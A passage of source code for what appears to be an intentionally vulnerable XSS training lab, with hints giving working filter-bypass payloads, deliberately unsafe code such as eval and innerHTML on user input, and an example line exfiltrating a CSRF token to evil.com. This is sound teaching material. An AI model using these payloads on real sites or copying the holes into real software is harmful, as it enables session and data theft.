  const rawMatch = req.url.match(/[?&]q=([^&]*)/);
  const rawQ = rawMatch ? rawMatch[1] : '';

  // LAYER 1: WAF/security proxy decodes once and inspects
  let wafDecoded;
  try { wafDecoded = decodeURIComponent(rawQ); } catch(e) { wafDecoded = rawQ; }

  // WAF filter: block dangerous patterns after one decode pass
  const blocked = /<\/?script\b[^>]*>/i.test(wafDecoded)
    || /\bon\w+\s*=/i.test(wafDecoded)
    || /javascript\s*:/i.test(wafDecoded);

  if (blocked) {
    res.send(levelPage(
      'Double Encoding Bypass', 11, 'Expert',
      'A WAF decodes your input once and checks for dangerous patterns (<code>&lt;script&gt;</code>, event handlers, <code>javascript:</code>). If the WAF passes it, the application decodes <strong>again</strong> before rendering.',
      'The WAF decodes once and checks. The app decodes a <strong>second</strong> time. If you double-encode your payload, the WAF sees harmless percent-encoded text after its decode pass, but the app\'s second decode produces the real payload. Try typing <code>%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> in the form (the form submission adds the first layer of encoding).',
      `<p style="color:#8b949e;margin-bottom:1rem;">The WAF decoded your input and found a dangerous pattern. Try to bypass the WAF.</p>
      <form method="GET">
        <input type="text" name="q" placeholder="Payload..." value="">
        <button type="submit">Submit</button>
      </form>
      <div class="output"><p style="color:#f85149;">WAF Blocked: Dangerous pattern detected after decoding.</p></div>`
    ));
    return;
  }

  // LAYER 2: Application layer decodes AGAIN (the double-decode vulnerability!)
  let q;
  try { q = decodeURIComponent(wafDecoded); } catch(e) { q = wafDecoded; }

  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage(
    'Double Encoding Bypass', 11, 'Expert',
    'A WAF decodes your input once and checks for dangerous patterns (<code>&lt;script&gt;</code>, event handlers, <code>javascript:</code>). If the WAF passes it, the application decodes <strong>again</strong> before rendering.',
    'The WAF decodes once and checks. The app decodes a <strong>second</strong> time. If you double-encode your payload, the WAF sees harmless percent-encoded text after its decode pass, but the app\'s second decode produces the real payload. Try typing <code>%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> in the form (the form submission adds the first layer of encoding).',
    `<p style="color:#8b949e;margin-bottom:1rem;">A WAF decodes your input once and scans for threats. If it passes, the application decodes it again before rendering. Can you sneak a payload past the WAF?</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 12 - Template Injection (client-side templating)
// ============================================================
app.get('/level/12', (req, res) => {
  const q = req.query.q || '';
  // Defense: strip all HTML tags
  const stripped = q.replace(/<[^>]*>/g, '');
  res.send(levelPage(
    'Client-Side Template Injection', 12, 'Expert',
    'All HTML tags are stripped server-side. But the page uses a naive client-side template engine that evaluates <code>{{expressions}}</code>.',
    'All HTML tags are removed, so you can\'t inject <code>&lt;script&gt;</code> or event handlers. But look at the client-side code &mdash; it replaces <code>{{...}}</code> with the result of <code>eval()</code>. Try: <code>{{alert(1)}}</code> or <code>{{constructor.constructor("alert(1)")()}}</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">All HTML tags are stripped. But there's a client-side template engine processing the output...</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" id="templateOutput">${stripped}</div>
    <script>
      // Naive client-side template engine
      (function() {
        var el = document.getElementById('templateOutput');
        var html = el.innerHTML;
        html = html.replace(/\\{\\{(.+?)\\}\\}/g, function(match, expr) {
          try { return eval(expr); } catch(e) { return match; }
        });
        el.innerHTML = html;
      })();
    </script>`
  ));
});

// ============================================================
// LEVEL 13 - postMessage XSS
// ============================================================
app.get('/level/13', (req, res) => {
  res.send(levelPage(
    'postMessage XSS', 13, 'Expert',
    'No server-side reflection at all. The page listens for <code>window.postMessage()</code> events and renders content without origin validation.',
    'The page has a <code>message</code> event listener that writes received data to the DOM via <code>innerHTML</code> without checking the origin. Open your browser console and run: <code>window.postMessage("&lt;img src=x onerror=alert(1)&gt;", "*")</code>. In a real attack, you\'d embed the target in an iframe on your domain and post a message to it.',
    `<p style="color:#8b949e;margin-bottom:1rem;">This page listens for cross-window messages. There's no form here &mdash; find the vulnerable message handler in the source.</p>
    <p style="color:#8b949e;margin-bottom:1rem;">Tip: Open DevTools Console (F12) to interact with the page.</p>
    <div class="output" id="messageOutput">
      <p style="color:#484f58;">Waiting for messages...</p>
    </div>
    <script>
      // Vulnerable postMessage handler - no origin check!
      window.addEventListener('message', function(e) {
        // INSECURE: No origin validation, direct innerHTML
        document.getElementById('messageOutput').innerHTML = '<p>Received: ' + e.data + '</p>';
      });
    </script>`
  ));
});

// ============================================================
// LEVEL 14 - SVG Upload XSS
// ============================================================
const uploadedSVGs = [];
app.get('/level/14', (req, res) => {
  const previews = uploadedSVGs.map((svg, i) => `<div style="padding:1rem;border:1px solid #30363d;border-radius:8px;margin-bottom:0.5rem;background:#0d1117;">${svg}</div>`).join('');
  res.send(levelPage(
    'SVG Upload XSS', 14, 'Expert',
    'File upload accepts SVG content. <code>&lt;script&gt;</code> tags are stripped from uploads, but SVGs are rendered inline.',
    'SVGs support event handlers natively. The filter only blocks <code>&lt;script&gt;</code> tags. Try uploading SVG content like: <code>&lt;svg&gt;&lt;rect width="100" height="100" style="fill:red" onmouseover="alert(1)"/&gt;&lt;/svg&gt;</code> or <code>&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</code>. SVG elements have their own event handler attributes that the filter doesn\'t catch.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Upload an SVG image. The server strips &lt;script&gt; tags but renders SVGs inline.</p>
    <form method="POST" action="/level/14">
      <textarea name="svg" rows="4" placeholder="Paste SVG markup here..." style="width:100%;min-width:100%;"></textarea>
      <button type="submit">Upload SVG</button>
    </form>
    <div style="margin-top:1rem;">${previews || '<p style="color:#484f58;">No uploads yet.</p>'}</div>
    <form method="POST" action="/level/14/clear" style="margin-top:1rem;"><button type="submit" style="background:#da3633;border-color:#f85149;color:#fff;">Clear Uploads</button></form>`
  ));
});

app.post('/level/14', (req, res) => {
  let svg = req.body.svg || '';
  // Defense: strip <script> tags only
  svg = svg.replace(/<\/?script\b[^>]*>/gi, '');
  if (svg) uploadedSVGs.push(svg);
  res.redirect('/level/14');
});

app.post('/level/14/clear', (req, res) => {
  uploadedSVGs.length = 0;
  res.redirect('/level/14');
});

// ============================================================
// LEVEL 15 - Mutation XSS (template content blind spot)
// ============================================================
app.get('/level/15', (req, res) => {
  const q = req.query.q || '';
  res.send(levelPage(
    'Mutation XSS', 15, 'Expert',
    'A client-side sanitizer uses DOMParser + <code>querySelectorAll</code> to strip scripts and event handlers, then re-inserts via innerHTML. After insertion, the page instantiates any <code>&lt;template&gt;</code> elements to support dynamic content.',
    'The sanitizer walks the DOM with <code>querySelectorAll(\'*\')</code> — but this method <strong>does not pierce into <code>&lt;template&gt;</code> element content</strong>. Template content lives in a separate DocumentFragment that is invisible to DOM queries. So anything inside <code>&lt;template&gt;</code> survives sanitization. After the sanitizer runs, the page instantiates templates by moving their content into the live DOM — executing whatever was hidden inside. Try: <code>&lt;template&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/template&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">A sanitizer strips dangerous elements, then the page renders <code>&lt;template&gt;</code> content for dynamic components. Can you hide a payload the sanitizer can't see?</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" id="mxssOutput"></div>
    <script>
      // Client-side sanitizer
      (function() {
        var input = ${JSON.stringify(q)};
        if (!input) return;
        // Parse with DOMParser (avoids innerHTML mutation during parsing)
        var parser = new DOMParser();
        var doc = parser.parseFromString('<div>' + input + '</div>', 'text/html');
        var root = doc.body.firstChild;
        // Remove <script> tags
        root.querySelectorAll('script').forEach(function(s) { s.remove(); });
        // Remove all event handlers
        root.querySelectorAll('*').forEach(function(el) {
          Array.from(el.attributes).forEach(function(attr) {
            if (attr.name.startsWith('on')) el.removeAttribute(attr.name);
          });
        });
        // Serialize and re-insert
        var sanitized = root.innerHTML;
        var output = document.getElementById('mxssOutput');
        output.innerHTML = sanitized;
        // Instantiate <template> elements for dynamic content rendering
        // (common pattern in frameworks — template content is assumed safe after sanitization)
        output.querySelectorAll('template').forEach(function(tmpl) {
          var clone = document.importNode(tmpl.content, true);
          tmpl.parentNode.insertBefore(clone, tmpl);
          tmpl.remove();
        });
      })();
    </script>`
  ));
});

// ============================================================
// LEVEL 16 - Recursive Filter (multi-pass)
// ============================================================
app.get('/level/16', (req, res) => {
  let q = req.query.q || '';
  // Defense: recursive stripping - keeps going until nothing changes
  let prev;
  do {
    prev = q;
    q = q.replace(/<\/?script\b[^>]*>/gi, '');
    q = q.replace(/\bon\w+\s*=/gi, '');
    q = q.replace(/javascript\s*:/gi, '');
    q = q.replace(/alert/gi, '');
    q = q.replace(/eval/gi, '');
    q = q.replace(/prompt/gi, '');
    q = q.replace(/confirm/gi, '');
    q = q.replace(/Function/g, '');
  } while (q !== prev);
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage(
    'Recursive Keyword Filter', 16, 'Expert',
    'The filter runs in a <strong>loop</strong> until no more changes occur. Strips: <code>&lt;script&gt;</code>, event handlers (<code>on*=</code>), <code>javascript:</code>, <code>alert</code>, <code>eval</code>, <code>prompt</code>, <code>confirm</code>, <code>Function</code>. Nesting tricks won\'t work here.',
    'The recursive filter defeats nesting. But it only blocks specific execution functions and <code>Function</code> (case-sensitive!). You can still inject HTML tags. Think about: <code>&lt;iframe src="data:text/html,&lt;script&gt;parent.window.postMessage(1,\'*\')&lt;/script&gt;"&gt;</code> won\'t work due to script stripping. Instead try: <code>&lt;img src=x onerr</code>... wait, on* is blocked. What about <code>&lt;iframe srcdoc="..."&gt;</code>? The srcdoc creates a new document context that the server filter can\'t reach. Try: <code>&lt;iframe srcdoc="&amp;lt;img src=x onerror=&#x27;top[`al`+`ert`](1)&#x27;&amp;gt;"&gt;&lt;/iframe&gt;</code>. HTML-encode the payload inside srcdoc so the server filter sees entities, but the browser decodes them in the iframe.',
    `<p style="color:#8b949e;margin-bottom:1rem;">The filter loops until clean. No nesting tricks, no keyword games. Think outside the box.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 17 - The Polyglot (multiple contexts at once)
// ============================================================
app.get('/level/17', (req, res) => {
  let q = req.query.q || '';
  // Defense: multiple filters
  q = q.replace(/<\/?script\b[^>]*>/gi, ''); // strip script tags
  q = q.replace(/"/g, '&quot;'); // encode double quotes
  res.send(levelPage(
    'The Polyglot', 17, 'Expert',
    '<code>&lt;script&gt;</code> tags stripped. Double quotes are HTML-encoded. Your input appears in <strong>three different contexts simultaneously</strong>: HTML body, an HTML attribute, and a JavaScript string.',
    'Your input is in 3 places. Double quotes are encoded so attribute breakout with <code>"</code> is hard. But single quotes are NOT encoded. Focus on the JS string context: close the single-quoted string with <code>\'</code>, inject code, and comment out the rest. Try: <code>\';alert(1)//</code>. The same payload will appear harmlessly in the other two contexts but execute in the JS one. For a true polyglot that works across all contexts, think about: <code>\'--&gt;&lt;/style&gt;&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code> &mdash; but remember, script tags are blocked. Focus on the weakest context.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input appears in three different contexts. Find the weakest one.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" style="margin-top:1rem;">
      <!-- Context 1: HTML body -->
      <p>HTML context: ${q}</p>
      <!-- Context 2: HTML attribute -->
      <input type="hidden" name="data" value="${q}">
      <!-- Context 3: JavaScript string -->
    </div>
    <script>
      var tracking = '${q.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}';
    </script>
    <div class="output" style="margin-top:0.5rem;">
      <p style="color:#484f58;font-size:0.8rem;">Hint: View page source to see all three injection points.</p>
    </div>`
  ));
});

// ============================================================
// LEVEL 18 - DOM Clobbering
// ============================================================
app.get('/level/18', (req, res) => {
  const q = req.query.q || '';
  // Defense: strip <script>, strip on* handlers, strip javascript:
  let filtered = q.replace(/<\/?script\b[^>]*>/gi, '');
  filtered = filtered.replace(/\bon\w+\s*=/gi, '');
  filtered = filtered.replace(/javascript\s*:/gi, '');
  res.send(levelPage(
    'DOM Clobbering', 18, 'Expert',
    '<code>&lt;script&gt;</code> tags stripped, event handlers stripped, <code>javascript:</code> stripped. The page uses named DOM elements to configure behavior.',
    'The page reads <code>window.config.href</code> for a redirect URL. An <code>&lt;a&gt;</code> element with <code>id=config</code> would clobber <code>window.config</code>, and its native <code>.href</code> property returns the resolved URL. The server blocks <code>javascript:</code> as text, but <strong>HTML entities inside the href attribute are decoded by the browser</strong>, not the server. Try: <code>&lt;a id=config href="&#38;#106;&#38;#97;&#38;#118;&#38;#97;&#38;#115;&#38;#99;&#38;#114;&#38;#105;&#38;#112;&#38;#116;&#38;#58;alert(1)"&gt;click&lt;/a&gt;</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">The page reads <code>window.config.href</code> to create a navigation link. Your HTML injection could overwrite <code>window.config</code>...</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: DOM Clobbering</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">In browsers, HTML elements with an <code>id</code> or <code>name</code> attribute automatically become properties of the <code>window</code> object. For example, <code>&lt;div id="foo"&gt;</code> makes <code>window.foo</code> reference that element. This is called <strong>DOM clobbering</strong> — injected HTML can overwrite global JavaScript variables without any script execution. If application code reads properties from <code>window.someVar</code> (e.g., <code>window.config</code>, <code>window.settings</code>), an attacker can inject HTML elements with matching IDs to hijack those values. Nested clobbering (using <code>&lt;form&gt;</code> + child elements, or <code>&lt;a&gt;</code> for <code>.href</code>) allows overwriting dot-notation paths like <code>config.href</code>. The <code>&lt;a&gt;</code> element\'s <code>.href</code> property is special — the browser resolves HTML entities and returns the full URL, making it a powerful clobber target.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" id="clobberOutput">${filtered}</div>
    <div id="widgetArea"></div>
    <script>
      // Application code that trusts window.config
      (function() {
        var widget = document.getElementById('widgetArea');
        // Default config — but if someone clobbers window.config...
        if (typeof window.config !== 'undefined' && window.config && window.config.href) {
          // Create a clickable link using the config
          widget.innerHTML = '<div style="padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;margin-top:1rem;"><a href="' + window.config.href + '" style="color:#58a6ff;">Click here to continue &rarr;</a></div>';
        } else {
          widget.innerHTML = '<div style="padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;margin-top:1rem;color:#484f58;">No config loaded.</div>';
        }
      })();
    </script>`
  ));
});

// ============================================================
// LEVEL 19 - Prototype Pollution → XSS
// ============================================================
app.get('/level/19', (req, res) => {
  const q = req.query.q || '';
  res.send(levelPage(
    'Prototype Pollution → XSS', 19, 'Expert',
    'No direct HTML injection — input is treated as JSON and merged into a config object. A client-side rendering function checks <code>config.html</code> to render custom content.',
    'The <code>merge()</code> function does a naive recursive merge without checking for <code>__proto__</code>. If you submit JSON like <code>{"__proto__":{"html":"&lt;img src=x onerror=alert(1)&gt;"}}</code>, you pollute <code>Object.prototype.html</code>. When the render function checks <code>config.html</code>, it finds the polluted value via the prototype chain and writes it to innerHTML.',
    `<p style="color:#8b949e;margin-bottom:1rem;">This page merges your JSON input into a config object, then renders content. No direct HTML injection — but the merge is dangerously naive.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: Prototype Pollution</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">Every JavaScript object inherits from <code>Object.prototype</code>. If an application does a naive deep merge/clone of user-controlled JSON, the attacker can set <code>__proto__</code> properties that pollute <strong>all</strong> objects in the runtime. For example, <code>{"__proto__": {"isAdmin": true}}</code> would make <code>({}).isAdmin === true</code> for every object. When combined with client-side rendering that checks <code>obj.someProperty</code> and uses it in <code>innerHTML</code>, this becomes an XSS vector — even though the attacker never directly injected HTML. Prototype pollution is particularly dangerous because it can affect code running <em>anywhere</em> in the application, not just at the injection point.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder='{"key": "value"}' value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" id="ppOutput"><p style="color:#484f58;">Submit JSON to configure the widget.</p></div>
    <script>
      // Vulnerable deep merge
      function merge(target, source) {
        for (var key in source) {
          if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
          } else {
            target[key] = source[key];
          }
        }
        return target;
      }

      (function() {
        var input = ${JSON.stringify(q)};
        if (!input) return;
        var config = { title: 'Widget' };
        try {
          var userObj = JSON.parse(input);
          merge(config, userObj);
        } catch(e) {
          document.getElementById('ppOutput').innerHTML = '<p style="color:#f85149;">Invalid JSON: ' + e.message + '</p>';
          return;
        }
        // Render widget — checks config.html for custom content
        var out = document.getElementById('ppOutput');
        out.innerHTML = '<h3 style="color:#58a6ff;margin-bottom:0.5rem;">' +
          (config.title || 'Widget') + '</h3>';
        if (config.html) {
          out.innerHTML += config.html;
        } else {
          out.innerHTML += '<p style="color:#8b949e;">Default widget content. Set "html" in config to customize.</p>';
        }
      })();
    </script>`
  ));
});

// ============================================================
// LEVEL 20 - Base Tag Injection
// ============================================================
app.get('/level/20', (req, res) => {
  const q = req.query.q || '';
  // Defense: strip <script>, strip on* handlers, strip javascript:
  let filtered = q.replace(/<\/?script\b[^>]*>/gi, '');
  filtered = filtered.replace(/\bon\w+\s*=/gi, '');
  filtered = filtered.replace(/javascript\s*:/gi, '');
  // Generate a nonce for CSP
  const nonce = Math.random().toString(36).substring(2, 15);
  const html = levelPage(
    'Base Tag Injection', 20, 'Expert',
    'CSP: <code>script-src \'nonce-...\' \'self\'</code>. <code>&lt;script&gt;</code> tags stripped, event handlers stripped, <code>javascript:</code> stripped. But your input is injected <strong>before</strong> the page\'s script tags.',
    'Since your input appears before the page\'s own <code>&lt;script&gt;</code> tags that use relative URLs, you can inject a <code>&lt;base href="https://YOUR-SERVER/"&gt;</code> tag. This changes the base URL for all relative script/resource loads. If the page loads <code>&lt;script src="app.js"&gt;</code>, it will now fetch from <code>https://YOUR-SERVER/app.js</code>. For this lab, an attacker-controlled endpoint exists at <code>/evil/</code>. Try: <code>&lt;base href="/evil/"&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input is rendered before the page's scripts. The page loads a relative script. CSP blocks inline scripts but allows 'self'.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: Base Tag Injection</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">The <code>&lt;base&gt;</code> HTML element specifies the base URL for all relative URLs in a document. If an attacker can inject a <code>&lt;base&gt;</code> tag before the page's own scripts that use relative paths (like <code>src="app.js"</code>), they can redirect those script loads to an attacker-controlled server. This is especially powerful when CSP uses <code>'self'</code> or <code>'nonce'</code> — the scripts are "allowed" by CSP since the <code>src</code> attribute doesn't change, but they now load from a different origin. This is why CSP's <code>base-uri</code> directive exists: to prevent <code>&lt;base&gt;</code> injection.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output">${filtered}</div>
    <!-- TODO: remove /evil/ debug path before going to production!! -->
    <script src="level20-app.js"></script>`
  );
  res.set('Content-Security-Policy', `script-src 'nonce-${nonce}' 'self'; base-uri *`);
  res.send(html.replace(/<script>/g, `<script nonce="${nonce}">`).replace(/<script src=/g, `<script nonce="${nonce}" src=`));
});

// Legitimate app.js for level 20
app.get('/level20-app.js', (req, res) => {
  res.type('application/javascript');
  // TODO: cleanup - /evil/ route still active, disable before launch
  res.send('document.querySelector(".output").innerHTML += "<p style=\\"color:#3fb950;\\">Legitimate app.js loaded from same origin.</p>";');
});

// Attacker-controlled "evil" endpoint that serves malicious JS
app.get('/evil/level20-app.js', (req, res) => {
  res.type('application/javascript');
  res.send('alert("XSS via base tag injection!")');
});

// ============================================================
// LEVEL 21 - Dangling Markup Injection
// ============================================================
app.get('/level/21', (req, res) => {
  const q = req.query.q || '';
  // Defense: strip <script>, strip on* handlers, strip javascript:
  let filtered = q.replace(/<\/?script\b[^>]*>/gi, '');
  filtered = filtered.replace(/\bon\w+\s*=/gi, '');
  filtered = filtered.replace(/javascript\s*:/gi, '');
  // Also block <base, <iframe, <object, <embed
  filtered = filtered.replace(/<\/?(?:base|iframe|object|embed)\b[^>]*>/gi, '');

  res.send(levelPage(
    'Dangling Markup Injection', 21, 'Expert',
    '<code>&lt;script&gt;</code>, event handlers, <code>javascript:</code>, <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;base&gt;</code> all stripped. A CSRF token is hidden in the page source.',
    'You can\'t execute JS directly. Your injection is <strong>inside a form</strong> that contains a hidden CSRF token. The <code>formaction</code> attribute on a <code>&lt;button&gt;</code> overrides the form\'s <code>action</code> for that button — redirect the submission to any URL on this server and the token will arrive as a query parameter. In a real attack this would be your own server. The page polls for successful exfiltration. This is a form of <strong>dangling markup / form hijacking</strong> — stealing data without executing any JavaScript.',
    `<p style="color:#8b949e;margin-bottom:1rem;">All script execution is blocked. But sometimes XSS isn't about executing code — it's about <strong>exfiltrating sensitive data</strong> from the page.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: Dangling Markup Injection</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">When you can inject HTML but <strong>cannot</strong> execute JavaScript (due to CSP, WAF, or aggressive filtering), dangling markup is a technique to steal page content. The idea: inject a tag with an <strong>unclosed attribute value</strong> like <code>&lt;a href="http://evil.com/steal?</code>. The browser will treat everything from the injection point until the next matching quote as part of the URL. If there's a CSRF token, API key, or other secret between your injection and the next quote, it gets included in the link URL. When the victim clicks the link (or it auto-navigates via <code>&lt;meta refresh&gt;</code>), the secret is sent to the attacker's server. This doesn't require script execution — it exploits HTML parsing rules. Note: Modern Chrome blocks <code>&lt;img&gt;</code> dangling markup containing newlines, but <code>&lt;a href&gt;</code>, <code>&lt;form action&gt;</code>, <code>&lt;button formaction&gt;</code>, and <code>&lt;meta http-equiv=refresh&gt;</code> still work.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output">
      <form action="/level/21" method="GET" id="profileForm">
        <p style="margin-bottom:0.75rem;">Bio: ${filtered}</p>
        <input type="hidden" name="csrf_token" value="SUPER_SECRET_TOKEN_abc123xyz">
        <button type="submit" style="background:#238636;color:#fff;border:none;padding:0.5rem 1rem;border-radius:6px;cursor:pointer;">Update Profile</button>
      </form>
    </div>
    <p style="color:#484f58;font-size:0.8rem;margin-top:0.5rem;padding:0 1.5rem;">Your injection is inside a form that contains a hidden CSRF token. The form submits to <code>/level/21</code>. View page source (Ctrl+U). Can you redirect the form submission to exfiltrate the token — using only HTML?</p>
    <div id="leakStatus" style="margin-top:1rem;padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;">
      <p style="color:#484f58;">Waiting for token exfiltration... (the page checks automatically)</p>
    </div>
    <script>
      // Poll the server to check if the token has been leaked
      (function poll() {
        fetch('/api/leak-check').then(function(r) { return r.json(); }).then(function(d) {
          if (d.leaked) {
            document.getElementById('leakStatus').innerHTML = '<p style="color:#3fb950;font-weight:600;">Token exfiltrated! The server received the secret.</p>';
            alert('Token Exfiltrated!');
          } else {
            setTimeout(poll, 1500);
          }
        }).catch(function() { setTimeout(poll, 3000); });
      })();
    </script>`
  ));
});

// Leak receiver for Level 21
app.get('/api/leak', (req, res) => {
  const leaked = req.url.replace('/api/leak?', '');
  console.log('[Level 21] Dangling markup exfiltrated:', leaked);
  if (leaked.includes('SUPER_SECRET_TOKEN')) {
    level21Leaked = leaked;
    // Redirect back to the level with a success flag
    res.redirect('/level/21?q=&leaked=true');
  } else {
    res.send('No token found in request. Try adjusting your payload.');
  }
});

// Check if token was leaked (polled by level 21 page)
app.get('/api/leak-check', (req, res) => {
  if (level21Leaked) {
    const data = level21Leaked;
    level21Leaked = false; // reset for next attempt
    res.json({ leaked: true, data: data });
  } else {
    res.json({ leaked: false });
  }
});

// ============================================================
// LEVEL 22 - JSON Injection in Script Block
// ============================================================
app.get('/level/22', (req, res) => {
  const q = req.query.q || '';
  // Defense: HTML-encode < and > to prevent tag breakout
  const escaped = q.replace(/</g, '\\u003c').replace(/>/g, '\\u003e');
  // Generate nonce
  const nonce = Math.random().toString(36).substring(2, 15);
  const html = levelPage(
    'JSON Injection in Script Block', 22, 'Expert',
    'Input is embedded inside a JSON object in a <code>&lt;script&gt;</code> block. Angle brackets are Unicode-escaped (<code>\\u003c</code>). CSP blocks inline scripts without the nonce.',
    'Your input is inside a JSON string value within a <code>&lt;script&gt;</code> tag. Angle brackets are escaped, so you can\'t inject new HTML tags. But you can close the JSON string with <code>"</code>, then inject JavaScript directly within the same script block. Try: <code>"-alert(1)-"</code> or <code>";alert(1);//</code>. Since you\'re already inside a nonced <code>&lt;script&gt;</code>, CSP allows execution. The key: <strong>you\'re already in a trusted JS context</strong>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input is placed inside a JSON object within a trusted script block. Can you break out of the JSON value?</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: JSON Injection in Script Blocks</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">Many web applications embed server-side data into pages using inline <code>&lt;script&gt;</code> blocks with JSON: <code>var config = {"name": "USER_INPUT"};</code>. Developers often focus on preventing HTML tag injection (encoding <code>&lt;</code> and <code>&gt;</code>) but forget that the attacker is <strong>already inside a JavaScript execution context</strong>. If the attacker can inject an unescaped <code>"</code>, they break out of the JSON string and can inject arbitrary JavaScript — all within the same trusted script block. This bypasses CSP because the injected code runs inside an already-allowed <code>&lt;script&gt;</code> tag. The fix: JSON.stringify() with proper escaping of <code>"</code>, <code>\\</code>, and line terminators, or better yet, use <code>data-*</code> attributes instead of inline JSON.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" id="jsonOutput"><p style="color:#484f58;">Submit a name for the config.</p></div>
    <script>
      var appConfig = {"name": "${escaped}", "role": "user", "theme": "dark"};
      document.getElementById('jsonOutput').innerHTML =
        '<p>Config loaded: ' + appConfig.name + ' (' + appConfig.role + ')</p>';
    </script>`
  );
  res.set('Content-Security-Policy', `script-src 'nonce-${nonce}' 'self'`);
  res.send(html.replace(/<script>/g, `<script nonce="${nonce}">`).replace(/<script src=/g, `<script nonce="${nonce}" src=`));
});

// ============================================================
// LEVEL 23 - URL Scheme Bypass via Entity Encoding
// ============================================================
app.get('/level/23', (req, res) => {
  const url = req.query.url || '';
  // Defense: block <script>, event handlers, and javascript: (case-insensitive)
  let filtered = url.replace(/<\/?script\b[^>]*>/gi, '');
  filtered = filtered.replace(/\bon\w+\s*=/gi, '');
  const jsBlocked = /javascript\s*:/i.test(filtered);

  if (jsBlocked) {
    res.send(levelPage(
      'URL Scheme Bypass', 23, 'Expert',
      '<code>&lt;script&gt;</code> stripped, event handlers stripped, <code>javascript:</code> blocked (case-insensitive). Input is placed into an <code>&lt;a href&gt;</code>.',
      'The filter checks for <code>javascript:</code> as a literal string in the raw input. But HTML attribute values are <strong>entity-decoded by the browser</strong> before the URL scheme is interpreted. Encode any character of "javascript:" using HTML entities: <code>&amp;#106;avascript:alert(1)</code> or <code>&amp;#x6A;avascript:alert(1)</code>. The server sees <code>&amp;#106;avascript:</code> (no literal "javascript:"), but the browser decodes it to <code>javascript:</code> and executes it when clicked.',
      `<p style="color:#8b949e;margin-bottom:1rem;">Provide a URL. The server blocks script tags, event handlers, and <code>javascript:</code>. Your URL is placed into a clickable link.</p>
      <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
        <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: URL Scheme Bypass via Entity Encoding</p>
        <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">When user input is placed into an HTML attribute like <code>href="..."</code>, the browser performs <strong>HTML entity decoding</strong> on the attribute value before interpreting it as a URL. This means <code>&amp;#106;</code> (the HTML entity for "j") becomes "j" in the browser's URL parser. A server-side filter that checks the raw string for <code>javascript:</code> won't find a match if the attacker uses <code>&amp;#106;avascript:</code> or <code>&amp;#x6A;avascript:</code>. The browser, however, decodes the entity and sees <code>javascript:</code> — executing the code when the link is clicked. This is a fundamental mismatch between server-side string matching and browser-side HTML parsing. Defense: decode all entities server-side before checking, or parse the URL properly and allowlist only <code>http:</code> and <code>https:</code> schemes.</p>
      </div>
